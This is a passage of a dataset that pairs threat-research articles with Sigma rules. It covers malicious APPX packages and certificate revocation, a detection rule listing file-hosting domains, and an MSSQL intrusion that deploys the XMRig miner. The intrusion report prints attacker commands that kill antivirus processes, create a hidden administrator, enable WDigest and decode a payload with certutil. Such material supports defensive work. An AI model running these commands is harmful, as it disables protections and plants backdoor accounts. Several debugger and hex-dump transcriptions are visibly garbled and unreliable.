[...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString Foresee Consulting Inc.\n```\n\n## Is a Malicious Windows App Trustworthy?\n\nThe `AppxSvc` service (`Appx Deployment Service`), which the DLL (dynamic-link library) `%SystemRoot%\\System32\\appxdeploymentserver.dll` implements, orchestrates the installation of *APPX* packages. When a user installs an *APPX* package, the `AppxSvc` service verifies the data integrity of the package and verifies that the package satisfies certain trust criteria. Figure 8 depicts a simplified overview of the data integrity verification process that the `AppxSvc` service conducts.\n\n```image\nAlt: Figure 8: A simplified overview of the data integrity verification process that the *AppxSvc* service conducts\nDescription: The image is a flowchart depicting the data integrity verification process conducted by the `AppxSvc` service when installing an *APPX* package. It outlines the steps involved in verifying the package signature (`AppxSignature.p7x`), the verification of `AppxBlockMap.xml`, and the subsequent verification of data blocks specified by `AppxBlockMap.xml`. The flowchart indicates decision points where the process can either continue or terminate based on whether each verification step is successful.\nTranscription: |\n  AppxSvc verifies the package signature AppxSignature.p7x\n      ├── Verified?\n      │   ├── No\n      │   │   └── AppxSvc terminates the package installation\n      │   └── Yes\n      │       └── AppxSvc verifies AppxBlockMap.xml\n      │           ├── Verified?\n      │           │   ├── No\n      │           │   │   └── AppxSvc terminates the package installation\n      │           │   └── Yes\n      │           │       └── AppxSvc verifies the data blocks that AppxBlockMap.xml specifies\n      │           │           ├── Verified?\n      │           │           │   ├── No\n      │           │           │   │   └── AppxSvc terminates the package installation\n      │           │           │   └── Yes\n      │           │           │       └── AppxSvc continues the package installation\n```\n\nIn summary, the data integrity verification process consists of the following steps:\n\n1. The `AppxSvc` service invokes the *WinVerifyTrust* function to verify the *APPX* package signature `AppxSignature.p7x`, that is, to verify the signed data in `AppxSignature.p7x` using the certificate chain in `AppxSignature.p7x` (see Figure 7). The signed data includes hashes of files that the *APPX* package stores, including `AppxBlockMap.xml` (see Figure 6). For example, Figure 9 depicts the hash value of `AppxBlockMap.xml` in the malicious `edge_update.appx` and the same value in `AppxSignature.p7x`, the package signature of `edge_update.appx`.\n\n   ```image\n   Alt: Figure 9: The hash value of *AppxBlockMap.xml* in the package signature of *edge_update.appx*\n   Description: The image is a screenshot of a command-line interface displaying the SHA-256 hash value of a file named 'AppxBlockMap.xml'. The command executed is 'Get-FileHash', which computes the hash of the specified file. The output shows the algorithm used (SHA256) and the corresponding hash value: '025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9'. This screenshot is relevant to the context of validating data integrity for malicious Windows apps, specifically in relation to the data integrity verification process involving the AppxSvc service.\n   Transcription: |\n     PS C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx> Get-FileHash .\\AppxBlockMap.xml\n     Algorithm Hash\n     --------- ----\n     SHA256  025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9\n   ```\n\n2. The successful verification of the signed data in `AppxSignature.p7x` enables the `AppxSvc` service to verify the data integrity of the files whose hashes are part of the signed data, including `AppxBlockMap.xml`. The `AppxSvc` service does this by first computing the SHA-256 hash value of `AppxBlockMap.xml` and then comparing the computed value with the SHA-256 hash value of `AppxBlockMap.xml` in the previously verified signed data.\n\n3. Once the `AppxSvc` service verifies the data integrity of `AppxBlockMap.xml`, the service verifies the integrity of the data blocks that `AppxBlockMap.xml` specifies (see Figure 6). The service does this by first computing the hash values of the data blocks and then comparing the computed values with the Base-64 encoded hash values in `AppxBlockMap.xml`.\n\nThe steps above ensure that the data in an *APPX* package is credible, with the overall process relying on a successful verification of the signed data in `AppxSignature.p7x`. However, for Windows to install an *APPX* package, also a malicious package, the system also has to verify that the package satisfies a set of trust criteria.\n\nPrevious research provides more background information on the steps above. This article focuses on the trust criteria that relate to the certificates in `AppxSignature.p7x` that the `AppxSvc` service uses to verify the signed data in `AppxSignature.p7x`.\n\nThese certificates represent the root of trust for the data integrity verification of an *APPX* package and for establishing trust in the package. In addition, in contrast to other *APPX* package-internal data structures for data integrity and trust verification, the certificates are more relevant entities from an operational perspective to end-users.\n\nWhen the `AppxSvc` service installs the malicious `edge_update.appx`, the service executes:\n\n- The *CertVerifyCertificateChainPolicy* function to validate the certificates in `AppxSignature.p7x` against the following certificate validation policies: *CERT_CHAIN_POLICY_AUTHENTICODE* (2), *CERT_CHAIN_POLICY_AUTHENTICODE_TS* (3), *CERT_CHAIN_POLICY_BASE* (1), and *CERT_CHAIN_POLICY_BASIC_CONSTRAINTS* (5). Among other certificate properties, `CertVerifyCertificateChainPolicy` validates whether the certificates are valid for code signing and whether the root certificate is trusted – present in a certificate store for trusted root certificates, such as *Trusted Root Certification Authorities*.\n- The *CertGetCertificateChain* function to check the revocation status of the certificates in `AppxSignature.p7x`.\n\nIf any validation by `CertVerifyCertificateChainPolicy` or `CertGetCertificateChain` fails, the `AppxSvc` service does not establish trust in the *APPX* package and terminates the installation of `edge_update.appx`.\n\nTo demonstrate a failed validation by `CertVerifyCertificateChainPolicy`, Figure 10 depicts a scenario that I crafted: The `AppxSvc` service executes `CertVerifyCertificateChainPolicy` to validate the certificates in the package signature of `edge_update.appx` against the *CERT_CHAIN_POLICY_AUTHENTICODE* (2) and *CERT_CHAIN_POLICY_BASE* (1) certificate validation policies. The *CERT_CHAIN_POLICY_BASE* policy fails the validation of the certificates due to an untrusted root certificate – the root certificate issued by DigiCert Trusted Root G4 is not present in a certificate store for trusted root certificates. This causes the `AppxSvc` service to terminate the installation of `edge_update.appx`.\n\n```image\nAlt: Figure 10: *CertVerifyCertificateChainPolicy* fails the validation of the certificates in the package signature of *edge_update.appx* due to an untrusted root certificate\nDescription: The image depicts a debugger output showing a breakpoint hit in the `CertVerifyCertificateChainPolicy` function from the Windows `CRYPT32` library. It displays the memory address and instruction being executed, along with the value of the register `rcx` at two different points. The values of `rcx` indicate the status or result of the operation, which is often used in debugging to trace the execution flow and validate the correctness of cryptographic operations related to certificate verification.\nTranscription: |\n  Breakpoint 0 hit\n  CRYPT32!CertVerifyCertificateChainPolicy:\n  00007ffb`34485560 4c8bdc        mov     r11,rsp\n  00007ffb`34485563 488bce        mov     rcx,rdx\n  00007ffb`34485566 488bda        mov     rbx,rdx\n  00007ffb`34485569 488bcb        mov     rcx,r11\n  00007ffb`3448556c 488bce        mov     rcx,rdx\n  00007ffb`3448556f 488bda        mov     rbx,rdx\n  00007ffb`34485572 488bcb        mov     rcx,r11\n  00007ffb`34485575 488bce        mov     rcx,rdx\n  00007ffb`34485578 488bda        mov     rbx,rdx\n  00007ffb`3448557b 488bcb        mov     rcx,r11\n  00007ffb`3448557e 488bce        mov     rcx,rdx\n  00007ffb`34485581 488bda        mov     rbx,rdx\n  00007ffb`34485584 488bcb        mov     rcx,r11\n  rcx=00000000000000002\n  00007ffb`34485587 488bce        mov     rcx,rdx\n  00007ffb`3448558a 488bda        mov     rbx,rdx\n  00007ffb`3448558d 488bcb        mov     rcx,r11\n  00007ffb`34485590 488bce        mov     rcx,rdx\n  00007ffb`34485593 488bda        mov     rbx,rdx\n  00007ffb`34485596 488bcb        mov     rcx,r11\n  00007ffb`34485599 488bce        mov     rcx,rdx\n  00007ffb`3448559c 488bda        mov     rbx,rdx\n  00007ffb`3448559f 488bcb        mov     rcx,r11\n  rcx=00000000000000001\n```\n\nIn practice, `CertVerifyCertificateChainPolicy` successfully validates the certificates in the package signature of the malicious `edge_update.appx`. This is because the root certificate, which is issued by DigiCert Trusted Root G4, is present in the *Trusted Root Certification Authorities* certificate store.\n\n## Revoked, or Not, That is the Question\n\nThe `AppxSvc` service executes the `CertGetCertificateChain` function to check the revocation status of the certificates in the package signature of `edge_update.appx`, starting from the end certificate in the certificate chain – the one issued to Foresee Consulting Inc. (see Figure 11).\n\n```image\nAlt: Figure 11: The certificate issued to Foresee Consulting Inc. in the context of the *CertGetCertificateChain* function (in ASN.1 format)\nDescription: The image presents a hexadecimal and ASCII dump of a file, likely related to a certificate or digital signature. The dump includes addresses, hexadecimal values, and their corresponding ASCII representations. It appears to contain details about a certificate associated with Foresee Consulting Inc., as indicated by the text within the ASCII section. This information is relevant to the analysis of the certificate chain and its potential revocation status in the context of malicious Windows applications.\nTranscription: |\n  0:083: db 00000246' cdbe9ad8 L0x7e8\n  00000246' cdbe9ad0 30 82 07 e4 82 01 0a 82 00 00 00 00 00 00 00 00\n  00000246' cdbe9ae0 c0 f1 8d a3 e2 e3 00 01 02 01 0e 10 0b 00 00\n  00000246' cdbe9af0 0d ed 09 2a 86 48 86 f7 0d 01 01 01 0b 00 00\n  00000246' cdbe9b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b10 15 03 65 04 53 00 01 01 01 0a 01 01 01 0b 00\n  00000246' cdbe9b20 30 49 30 47 06 09 2a 86 48 86 f7 0d 01 01 01\n  00000246' cdbe9b30 0c 01 01 01 0b 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b40 20 47 47 2a 64 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9b50 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b60 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b70 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b80 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b90 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9ba0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bb0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bc0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bd0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9be0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bf0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9c00 0a 13 17 46 67 72 73 65 73 66 65 67 66 67 67\n  00000246' cdbe9c10 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c20 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c30 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c40 04 81 ad 38 81 aa 53 a0 51 a0 48 46 86 4d 68\n  00000246' cdbe9f20 74 0a 3a 2f 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e\n  00000246' cdbe9f30 72 74 2e 66 2f 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9f40 72 72 67 67 67 67 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f50 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f60 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f70 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f80 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f90 48 41 73 67 67 67 67 67 67 67 67 67 67 67 67\n```\n\n`AppxSvc` executes `CertGetCertificateChain` such that the function verifies the revocation status of all certificates in the certificate chain, including the root certificate – the `dwFlags` parameter of `CertGetCertificateChain` has the value of **0x20000000** (*CERT_CHAIN_REVOCATION_CHECK_CHAIN*, see Figure 12).\n\n```image\nAlt: Figure 12: *CertGetCertificateChain* verifies the revocation status of all certificates in the certificate chain\nDescription: The image shows a debugger output for the `CertGetCertificateChain` function from the CRYPT32 library. It highlights a breakpoint where the function's execution has paused, displaying several memory addresses and values. Notably, the value '20000000' is emphasized, which corresponds to the `dwFlags` parameter used in the certificate chain verification process. This output is relevant as it provides technical details about the function's operation in the context of checking certificate revocation.\nTranscription: |\n  Breakpoint 3 hit\n  CRYPT32!CertGetCertificateChain:\n  00007ffb`6e9b4ae0 488bc4          mov     rax,rsp\n  [...]\n  0:008> dps @rsp\n  000000ab`68ffef58  46f6c19b appxdeploymentserver![...]\n  000000ab`68ffef60  00000000\n  000000ab`68ffef68  46fdc60a appxdeploymentserver![...]\n  000000ab`68ffef70  00000000\n  000000ab`68ffef78  00000000\n  000000ab`68ffef80  68ffefa0\n  000000ab`68ffef88  000000246`20000000\n```\n\nPrior to the revocation of the end certificate issued to Foresee Consulting Inc., `CertGetCertificateChain` did not indicate an issue with the certificate chain in the package signature of `edge_update.appx`. This resulted in the `AppxSvc` service completing the installation of the malicious *APPX* package and therefore compromising the system. Windows places installed Windows Apps in the `%ProgramFiles%\\WindowsApps` directory (see Figure 13).\n\n```image\nAlt: Figure 13: The *AppxSvc* service has completed the installation of the malicious *edge_update.appx*\nDescription: The image displays a file directory from the Windows operating system, specifically located under the 'Program Files\\WindowsApps' path. It shows a folder named 'eediwjus' containing two files: 'eediwjus.dll' (an application extension) and 'eediwjus' (an application), both modified on 07/07/2022 at 18:52. The file sizes are 6 KB for 'eediwjus.dll' and 4 KB for the 'eediwjus' application.\nTranscription: |\n  File: eediwjus\n  Location: Program Files\\WindowsApps\\3669e262-ec02-4e9d-bcb4-3d008b4afac9_96.0.1072.0_neutral_vgngsjmjd8sje\n  \n  Name            Date modified       Type                     Size\n  eediwjus.dll    07/07/2022 18:52    Application extension    6 KB\n  eediwjus        07/07/2022 18:52    Application              4 KB\n```\n\nAfter the revocation of the end certificate, `CertGetCertificateChain` indicates that a certificate in the package signature of `edge_update.appx` has been revoked by storing the *CERT_TRUST_IS_REVOKED* (**0x00000004**) error code in a *CERT_TRUST_STATUS* structure (see Figure 14). This results in the `AppxSvc` service terminating the installation of the malicious *APPX* package with an error (see Figure 15).\n\n```image\nAlt: Figure 14: *CertGetCertificateChain* stores the *CERT_TRUST_IS_REVOKED* (*0x00000004*) error code in a *CERT_TRUST_STATUS* structure\nDescription: The image displays a hexadecimal dump of a data segment, showing memory addresses and corresponding byte values. Notably, the value '04' is highlighted in the dump, likely indicating the presence of the *CERT_TRUST_IS_REVOKED* error code (0x00000004) relevant to the context of certificate revocation in the *CertGetCertificateChain* function. This representation is typically used in technical analysis for debugging or examining memory related to software behavior.\nTranscription: |\n  0:008> db 00000246`cb949c60\n  00000246`cb949c60  48 00 00 00 04 00 00 00  00 00 00 00 01 00 00 00  H..............\n  00000246`cb949c70  e0 9c 94 cb 46 02 00 00  00 00 00 00 00 00 00 00  ....F..........\n```\n\n```image\nAlt: Figure 15: The *AppxSvc* service terminates the installation of the malicious *edge_update.appx* with an error\nDescription: The image shows an error log from a command line interface indicating a failed attempt to deploy a malicious Windows app package (`malicious_appx.appx`). It details the error message, including an HRESULT code (0x800B010C) indicating that a certificate was explicitly revoked by its issuer. The log provides a command suggestion to check the Event Log for further details and includes the line of code attempting the app deployment, along with additional context about the error.\nTranscription: |\n  add-appxpackage : Deployment failed with HRESULT: 0x800B010C, A certificate was explicitly revoked by its issuer.\n  Deployment Add operation with target volume C: on Package 36096262-ec02-4e9d-bcb4-3d0884afa96_0.0.1072.0_neutral__vgnsgjmdj8sje from: (malicious_appx.appx) failed with error 0x800B010C. See http://go.microsoft.com/fwlink/?LinkId=235160 for help diagnosing app deployment issues.\n  NOTE: For additional information, look for [ActivityId] b3f723a8-91de-0000-4277-f7b3de91d801 in the Event Log or use the command line Get-AppPackageLog -ActivityID b3f723a8-91de-0000-4277-f7b3de91d801\n  At line:1 char:1\n  + add-appxpackage C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : NotSpecified: (C:\\Users\\<user>\\...icious_appx.appx:String) [Add-AppxPackage], Exception\n      + FullyQualifiedErrorId : DeploymentError,Microsoft.Windows.Appx.PackageManager.Commands.AddAppxPackageCommand\n```\n\n## Recommendations for Users and Administrators\n\nFor Windows to install a Windows App that is packaged, for example, into an *APPX* package, the system first has to establish trust in the package. To this end, Windows verifies the data integrity of the package based on the package signature and evaluates whether the package satisfies certain trust criteria. Some of the trust criteria that relate to the certificates in the package signature are the following:\n\n- If Windows App sideloading is not enabled on the system, the *APPX* package must originate from the Microsoft Store and be therefore counter-signed by Microsoft. App sideloading is not enabled by default on recent Windows versions. However, organizations may enable App sideloading on their managed devices or ask customers to turn App sideloading on in order to enable the deployment of Windows Apps built specifically for internal or customer use). These Windows Apps are known as LOB (line-of-business) Windows Apps.\n- If Windows App sideloading is enabled on the system, the *APPX* package must be signed such that:\n  - The system trusts the root certificate of the certificate chain in the signature – the certificate must be present in a certificate store for trusted root certificates.\n  - No certificate in the chain is revoked at package installation time.\n\nThe majority of the malicious *APPX* packages that the security community has observed as part of attacks have satisfied the criteria above.\n\nRecommendations for users and administrators for protecting against attacks that involve malware delivery via malicious Windows Apps include the following:\n\n- **For users:**\n  - Avoid downloading Windows Apps from the Microsoft Store without thoroughly examining relevant information, such as App vendor details, and number and quality of published user reviews. Be careful about typosquatting attempts – malicious Windows Apps with names that are very similar to legitimate, popular Windows Apps. Typosquatting is popular among malicious actors. Attackers have recently managed to plant malicious Windows Apps in the Microsoft Store. In addition, SentinelLabs has recently investigated typosquatting attacks against the crates.io Rust and the PyPI Python software repositories, referred to as CrateDepression and Pymafka.\n  - Stay vigilant against phishing attacks and avoid installing software and software updates from unknown sources. Malicious Windows Apps often come under the disguise of critical software updates.\n\n- **For administrators:** Malicious actors often use compromised legitimate code signing material, with end certificates that chain to trusted root certificates, to sign malicious Windows Apps. As this article shows, this enables the installation of the malicious App packages on victim systems. Therefore:\n  - Make sure that the systems under your management can timely and correctly verify whether a certificate has been revoked. This includes unrestricted access to CRL (Certificate Revocation List) and OCSP (Online Certificate Status Protocol) URLs, and/or up-to-date local CRL and OCSP caches. Certificate revocation is a crucial measure against the malicious Windows App threat.\n  - Make sure that the code signing material of your organization is kept secure. This is to prevent malicious actors from distributing malware masquerading as Windows Apps that originate from your organization.",
    "sigma_rule": {
      "title": "Suspicious Remote AppX Package Locations",
      "id": "8b48ad89-10d8-4382-a546-50588c410f0d",
      "status": "experimental",
      "description": "Detects an appx package added to the pipeline of the \"to be processed\" packages which was downloaded from a suspicious domain.\n",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2024-08-22",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854,
          "Path|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_domains.yml"
  },
  "32": {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer\n\n**Categories:** coinminer, exploit \n**Published Date:** July 11, 2022 \n\n---\n\nIn March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting.\n\nUS CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link).\n\n---\n\n## Summary\n\nOver the month of March, we observed a cluster of activity targeting MSSQL servers. The activity started via password brute force attempts for the MSSQL SA account. These brute force attempts were observed repeatedly over the month. Examples included one cluster of 24,000 failed attempts from the same source, over a 27-hour effort, before they finally managed to guess the password. After obtaining the correct credentials, the attackers spawned a command shell via `xp_cmdshell`. According to Microsoft documentation, `xp_cmdshell` spawns a Windows command shell and passes in a string for execution.\n\nUsing `xp_cmdshell`, the threat actors were able to execute any command against the compromised server. They attempted to kill a bunch of AV programs by using `taskkill.exe`. The threat actors then wrote multiple commands to a batch file by using `echo` and redirecting the strings to a file named `1.bat`. After the batch file was written, they proceeded to perform the same action echoing data into a file named `bigfile.txt`. After finishing writing to that file, they ran `certutil` to decode the base64 data into an executable file. This executable was a privilege escalation tool used to execute the batch file to ensure it executed with high enough permissions. They then executed the batch script. The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.\n\nOnce the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner. They dropped a Binary Managed Object Format (BMOF) file along with the miner itself to achieve this. The threat actors used `mofcomp.exe` to decompile the BMOF binary and register a malicious class in the WMI repository. The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.\n\nNo other activity beyond the mining was observed before the threat actors were evicted.\n\n---\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, Sliver, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nArtifacts for this case are limited due to the environment. A few log sources are available for this case under our Security Researcher and Organization services.\n\n---\n\n## Initial Access\n\nThe initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.\n\nDuring the intrusions, we could see SQL Server event ID **18456** Failure Audit Events in the Windows application logs. We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.\n\n### Example of the failed brute force attempts:\n\n```image\nAlt: Failed Attempts\nDescription: The image displays a series of failed login attempts to a SQL Server, showing usernames and the corresponding reasons for failure. Each entry indicates whether the password did not match or the login could not be found. The usernames include common administrative names like 'sa' and 'admin,' highlighting potential brute force attack attempts.\nTranscription: |\n  sa | Reason: Password did not match that for the login provided. |\n  hbv7 | Reason: Could not find a login matching the name provided. |\n  su | Reason: Could not find a login matching the name provided. |\n  ps | Reason: Could not find a login matching the name provided. |\n  vice | Reason: Could not find a login matching the name provided. |\n  kisadmin | Reason: Could not find a login matching the name provided. |\n  401hk | Reason: Could not find a login matching the name provided. |\n  sysdba | Reason: Could not find a login matching the name provided. |\n  admin | Reason: Password did not match that for the login provided. |\n  uep | Reason: Could not find a login matching the name provided. |\n  bizbox | Reason: Could not find a login matching the name provided. |\n  neterp | Reason: Could not find a login matching the name provided. |\n  unierp | Reason: Could not find a login matching the name provided. |\n  sp | Reason: Could not find a login matching the name provided. |\n  root | Reason: Password did not match that for the login provided. |\n  bwsa | Reason: Could not find a login matching the name provided. |\n```\n\n### Followed by eventual successful logins:\n\n```image\nAlt: Successful Logins\nDescription: The image depicts a table displaying SQL Server audit events. It includes columns such as 'TimeWritten,' 'EventID,' 'EventTypeName,' 'EventCategory,' 'SourceName,' and 'Strings,' showing multiple entries for successful audit events. The entries indicate the timestamps of the events, the event type as 'Success Audit event,' and the source name as 'MSSQL$SQLEXPRESS,' suggesting automated access attempts by the threat actor.\nTranscription: |\n  | TimeWritten      | EventID | EventT | EventTypeName       | EventC | SourceName       | Strings       |\n  | ---------------- | ------- | ------ | ------------------- | ------ | ---------------- | ------------- |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:01 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n```\n\nIt is likely that multiple successful logins were observed due to the automated access script that the threat actor was using.\n\n---\n\n## Execution\n\nIn the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (`xp_cmdshell`). This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.\n\n### Example of command execution following a successful authentication to SQL database using `xp_cmdshell`:\n\n```\nEXEC xp_cmdshell 'whoami'\n```\n\nAt a high level, the overall execution events can be depicted in the below diagram:\n\n```image\nAlt: Execution Diagram\nDescription: The image is a flow diagram illustrating the execution events following a successful brute-force attack against a SQL Server. It details the steps from authentication via brute force, the use of the command shell via `xp_cmdshell`, writing various scripts and files to disk, compiling a MOF file, and killing antivirus processes. The diagram includes visual elements like boxes and arrows showing the progression of actions taken by threat actors, such as adding local administrator accounts and setting up a scheduled task for running XMRig CoinMiner.\nTranscription: |\n  START\n    Brute-Force Attack Against SQL Server\n      Successful Authentication via Brute Force Attack\n        Command Shell via xp_cmdshell\n          Writes 1.bat, and bigfile.txt to disk\n            decodes bigfile.txt with certutil into bigfile.exe\n              bigfile.exe used to run 1.bat\n                1.bat performs the following\n                  Adding Local Administrator Accounts\n                  Hiding New Local Admin Accounts\n                  Enables RDP\n                  Enables Widget\n          Writes kit.bat to disk\n            Running XMRig CoinMiner\n              Creating scheduled task for CoinMiner\n      Compiling BMOF file\n        Adding a new class/ MyASEventConsumer in WMI repository\n          EventConsumer (Script or executable to run)\n            Creates persistence\n            Download/executes VBE script\n              - Random Name\n              - Executes every day at 23:00\n          EventFilter (Trigger condition)\n          Binding (Tie together Filter + Consumer)\n    Kills AV Processes\n```\n\nIf we look into the Windows Application logs, specifically, the SQL Server event ID 15457 captures this as an `xp_cmdshell` event. Additionally, the SQL Server audit collection also captures similar events. The first commands executed by the threat actors included using `taskkill` for various anti-virus software.\n\n### Commands to kill AV processes:\n\n```\ntaskkill /f /im egui.exe\ntaskkill /f /im QQPCTray.exe\ntaskkill /f /im SafeDogGuardCenter.exe\ntaskkill /f /im 360safe.exe\ntaskkill /f /im net1895.exe\ntaskkill /f /im ekrn.exe\ntaskkill /f /im 360rp.exe\ntaskkill /f /im QQPCMgr.exe\ntaskkill /f /im SafeDogServerUI.exe\ntaskkill /f /im SafeDogSiteIIS.exe\n```\n\nThe threat actors also favored the execution of batch scripts on the compromised host. They used `xp_cmdshell` to write a batch script (`1.bat`) to disk by redirecting strings to the file using `echo` commands.\n\n```image\nAlt: Batch Script Creation\nDescription: The image displays a table detailing a process execution log from a cybersecurity incident. It includes columns for 'Initiating Process File Name', 'Action Type', 'Initiating Process Command Line', 'Initiating Process Account Name', and 'File Name'. The table shows that 'cmd.exe' initiated a file creation action, specifically creating a batch file named '1.bat'. The command line executed involves various administrative commands, such as adding a user to local groups and modifying registry entries.\nTranscription: |\n  | Initiating Process File Name | Action Type | Initiating Process Command Line| Initiating Process Account Name | File Name |\n  | ---------------------------- | ----------- || ------------------------------- | --------- |\n  | cmd.exe                      | FileCreated | \"cmd.exe\" /c (echo NET USER Admin\\$ !67hC5140Rvg /ADD /expires:never & echo NET LOCALGROUP Administrators /ADD Admin\\$ & REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v SpecialAccounts\\Userlist /t REG_DWORD /d 0 & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f & echo reg add \"HKLM\\LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo NET LOCALGROUP Administrators /ADD Admin\\$ & echo NET LOCALGROUP Administrators /ADD Admin\\$ > %USERPROFILE%\\AppData\\1.bat | mssql$sqlexpress                | 1.bat     |\n```\n\nA second set of commands was also echoed into a file named `bigfile.txt`. Once complete, `certutil` was used to decode the text and create an executable file.\n\n### Certutil command:\n\n```\ncmd.exe /c certutil -decode %USERPROFILE%\\AppData\\bigfile.txt %USERPROFILE%\\AppData\\bigfile.exe\n```\n\nThis executable was then used in executing the `1.bat` batch file.\n\n### Command to execute batch file:\n\n```\ncmd.exe /c %USERPROFILE%\\AppData\\bigfile.exe -i -c %USERPROFILE%\\AppData\\1.bat\n```\n\nPulling the hash of the file that was written matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner: \nhttps://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community\n\n```image\nAlt: THOR Scanner\nDescription: The image displays a screenshot from the THOR APT Scanner, detailing YARA signature matches for various hacking tools and indicators. It includes specific rules like 'Hacktool_Inject_Incognito' and 'Hacktool_Privilege_Escalation_Jan22_1,' with links to their descriptions and detection information. Detection timestamps and AV detection rates (e.g., 8/67) are also provided, indicating the effectiveness of the rules in identifying malicious activity.\nTranscription: |\n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Inject_Incognito\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Inject_Incognito\n  DESCRIPTION: 